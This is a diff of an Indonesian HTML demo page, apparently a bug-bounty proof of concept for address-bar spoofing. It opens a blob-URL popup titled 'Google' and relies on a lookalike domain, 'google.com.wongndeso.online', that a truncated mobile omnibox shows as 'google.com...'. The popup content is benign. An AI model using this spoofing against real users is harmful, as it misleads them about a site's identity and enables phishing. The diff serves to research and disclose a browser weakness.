@@ -1,22 +1,21 @@
-
+<!-- /bbp/google/g00g/3.html -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Popup dengan Service Worker</title>
+    <title>Demo Blob URL</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 50px;
             background: #f5f5f5;
         }
+        .container { max-width: 600px; margin: 0 auto; }
+        h1 { color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 30px; }
         button {
             padding: 15px 30px;
             font-size: 18px;
@@ -38,9 +37,6 @@
             background: white;
             border-radius: 12px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 500px;
-            margin-left: auto;
-            margin-right: auto;
         }
         .success {
             padding: 12px;
@@ -57,87 +53,190 @@
             color: #004085;
             margin-top: 10px;
         }
-        .status {
+        .demo-box {
             margin-top: 20px;
-            padding: 12px;
-            background: #e8f5e9;
+            padding: 20px;
+            background: #f8f9fa;
             border-radius: 8px;
+            border: 2px dashed #6c757d;
+        }
+        .url-preview {
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #212529;
+            word-break: break-all;
+        }
+        .feature {
+            display: inline-block;
+            margin: 5px 10px;
+            padding: 5px 15px;
+            background: #e8f5e9;
+            border-radius: 20px;
+            font-size: 13px;
             color: #2e7d32;
         }
-        .error {
+        .ip-info {
             margin-top: 20px;
             padding: 12px;
-            background: #ffebee;
+            background: #e3f2fd;
             border-radius: 8px;
-            color: #c62828;
+            border: 1px solid #90caf9;
+            color: #0d47a1;
         }
-        code {
-            background: #f4f4f4;
+        .ip-info code {
+            background: #bbdefb;
             padding: 2px 8px;
             border-radius: 4px;
-            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <h1>🎯 Service Worker Demo</h1>
-    <p style="margin-top: 10px; color: #666;">Omnibox = google.com + Konten permanen tahan refresh</p>
-    <br>
-    <button onclick="bukaPopup()">🚀 Buka Popup</button>
-    
-    <div class="card">
-        <div class="success">
-            ✅ Omnibox menampilkan <strong>google.com</strong>
+    <div class="container">
+        <h1>🎯 Blob URL + IP Lokal</h1>
+        <p class="subtitle">Omnibox = <strong>google.com...</strong> (terpotong di HP)</p>
+        
+        <button onclick="bukaPopup()">🚀 Buka Popup</button>
+        
+        <div class="card">
+            <div class="success">
+                ✅ Omnibox di HP: <strong>google.com...</strong> (terpotong)
+            </div>
+            <div class="info">
+                📄 Konten: <strong>&lt;h1&gt;This is new page&lt;/h1&gt;</strong>
+            </div>
+            <div style="margin-top: 10px; color: #28a745; font-weight: bold;">
+                🔄 Pull-to-refresh → konten tetap ada! (Blob URL)
+            </div>
         </div>
-        <div class="info">
-            📄 Konten: <strong>&lt;h1&gt;This is new page&lt;/h1&gt;</strong>
-        </div>
-        <div style="margin-top: 10px; color: #28a745; font-weight: bold;">
-            🔄 Pull-to-refresh di Android → konten tetap ada!
-        </div>
-    </div>
 
-    <div class="status" id="swStatus">
-        ⏳ Status Service Worker: <span id="swStatusText">Memeriksa...</span>
+        <div class="ip-info">
+            📡 <strong>Akses dari HP:</strong><br>
+            <code>http://20.20.20.158:1111/g00g/3.html</code>
+            <br><br>
+            📡 <strong>Atau dengan domain palsu (jika hosts di-set):</strong><br>
+            <code>http://google.com.wongndeso.online:1111/g00g/3.html</code>
+        </div>
+
+        <div class="demo-box">
+            <h3>📱 Preview di HP</h3>
+            <div style="background: #fff; border-radius: 12px; padding: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <div style="background: #f1f3f4; padding: 8px 12px; border-radius: 20px; font-size: 14px; color: #5f6368; display: flex; align-items: center; gap: 8px;">
+                    <span>🔒</span>
+                    <span style="color: #1a73e8; font-weight: 500;">google.com.wongndeso.online</span>
+                    <span style="margin-left: auto; font-size: 12px;">⭐</span>
+                </div>
+                <div style="margin-top: 15px; padding: 20px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 8px; color: white; text-align: center;">
+                    <h2 style="font-size: 24px;">✨ This is new page ✨</h2>
+                    <p style="font-size: 14px; opacity: 0.8;">Omnibox: google.com</p>
+                </div>
+            </div>
+        </div>
+
+        <div style="margin-top: 20px; padding: 12px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107; color: #856404;">
+            <strong>💡 Teknologi:</strong> Blob URL + Domain Palsu.<br>
+            <small>Tanpa Service Worker, tanpa HTTPS, cukup browser modern.</small>
+        </div>
     </div>
 
     <script>
         // ============================================
-        // 📋 REGISTRASI SERVICE WORKER
-        // ============================================
-        
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js', { scope: '/aboutblankspoofer/' })
-                .then(function(registration) {
-                    console.log('✅ Service Worker terdaftar:', registration);
-                    document.getElementById('swStatusText').textContent = '✅ Terdaftar';
-                    document.getElementById('swStatusText').style.color = '#2e7d32';
-                })
-                .catch(function(error) {
-                    console.log('❌ Gagal daftar Service Worker:', error);
-                    document.getElementById('swStatusText').textContent = '❌ Gagal: ' + error.message;
-                    document.getElementById('swStatusText').style.color = '#c62828';
-                });
-        } else {
-            document.getElementById('swStatusText').textContent = '❌ Browser tidak mendukung Service Worker';
-            document.getElementById('swStatusText').style.color = '#c62828';
-        }
-
-        // ============================================
-        // 🚀 FUNGSI BUKA POPUP
+        // 🚀 FUNGSI BUKA POPUP DENGAN BLOB URL
         // ============================================
         
         function bukaPopup() {
-            // Buka popup dengan URL /aboutblankspoofer/google.com
-            // Service Worker akan meng-intercept request ini
-            const popup = window.open('/aboutblankspoofer/google.com', '_blank', 'width=600,height=400');
+            const htmlContent = `
+                <!DOCTYPE html>
+                <html lang="id">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Google</title>
+                    <style>
+                        * { margin: 0; padding: 0; box-sizing: border-box; }
+                        body {
+                            font-family: Arial, sans-serif;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 100vh;
+                            margin: 0;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            color: white;
+                            flex-direction: column;
+                            padding: 20px;
+                        }
+                        .container { text-align: center; animation: fadeIn 0.8s ease; }
+                        h1 {
+                            font-size: 48px;
+                            border: 3px solid white;
+                            padding: 30px 60px;
+                            border-radius: 20px;
+                            background: rgba(255,255,255,0.15);
+                            backdrop-filter: blur(5px);
+                            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                            animation: pulse 2s infinite;
+                        }
+                        @keyframes pulse {
+                            0%, 100% { transform: scale(1); }
+                            50% { transform: scale(1.05); }
+                        }
+                        @keyframes fadeIn {
+                            from { opacity: 0; transform: translateY(-20px); }
+                            to { opacity: 1; transform: translateY(0); }
+                        }
+                        .sub { margin-top: 20px; background: rgba(0,0,0,0.3); padding: 10px 25px; border-radius: 20px; }
+                        .badge { display: inline-block; margin-top: 20px; padding: 8px 20px; background: #28a745; border-radius: 20px; }
+                        .info-box { margin-top: 30px; padding: 15px 25px; background: rgba(255,255,255,0.15); border-radius: 12px; backdrop-filter: blur(3px); }
+                        .refresh-count { margin-top: 15px; font-size: 24px; font-weight: bold; color: #ffd700; }
+                        .url-display { margin-top: 10px; padding: 5px 15px; background: rgba(0,0,0,0.2); border-radius: 8px; font-size: 12px; font-family: monospace; }
+                        .blob-badge { margin-top: 15px; padding: 5px 15px; background: rgba(255,255,255,0.1); border-radius: 20px; font-size: 11px; color: #aaa; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <h1>✨ This is new page ✨</h1>
+                        <div class="sub">📍 Omnibox: <strong>google.com</strong></div>
+                        <div class="badge">🛡️ TAHAN REFRESH</div>
+                        <div class="info-box" id="infoMessage">📌 Konten menggunakan Blob URL</div>
+                        <div class="refresh-count" id="refreshCounter">🔄 Refresh #0</div>
+                        <div class="url-display" id="urlDisplay">📍 URL: blob:http://...</div>
+                        <div class="blob-badge">⚡ Tanpa Service Worker</div>
+                    </div>
+                    <script>
+                        (function() {
+                            const COUNTER_KEY = 'blob_popup_counter';
+                            let count = parseInt(localStorage.getItem(COUNTER_KEY) || '0');
+                            count++;
+                            localStorage.setItem(COUNTER_KEY, count);
+                            document.getElementById('refreshCounter').textContent = '🔄 Refresh #' + count;
+                            const infoEl = document.getElementById('infoMessage');
+                            if (count === 1) {
+                                infoEl.innerHTML = '🎉 <strong>Pertama kali dibuka!</strong> Konten dari Blob URL';
+                                infoEl.style.background = 'rgba(40, 167, 69, 0.3)';
+                            } else {
+                                infoEl.innerHTML = '🔄 <strong>Refresh ke-' + count + '!</strong> Konten tetap ada!';
+                                infoEl.style.background = 'rgba(255, 193, 7, 0.3)';
+                            }
+                            document.getElementById('urlDisplay').textContent = '📍 URL: ' + window.location.href;
+                        })();
+                    <\/script>
+                </body>
+                </html>
+            `;
+
+            const blob = new Blob([htmlContent], { type: 'text/html;charset=utf-8' });
+            const blobUrl = URL.createObjectURL(blob);
+            const popup = window.open(blobUrl, '_blank', 'width=600,height=400');
             
             if (!popup) {
                 alert('⚠️ Pop-up diblokir! Izinkan pop-up untuk situs ini.');
                 return;
             }
             
-            console.log('✅ Popup dibuka dengan URL: /aboutblankspoofer/google.com');
+            console.log('✅ Popup dibuka dengan Blob URL:', blobUrl);
         }
     </script>
 </body>
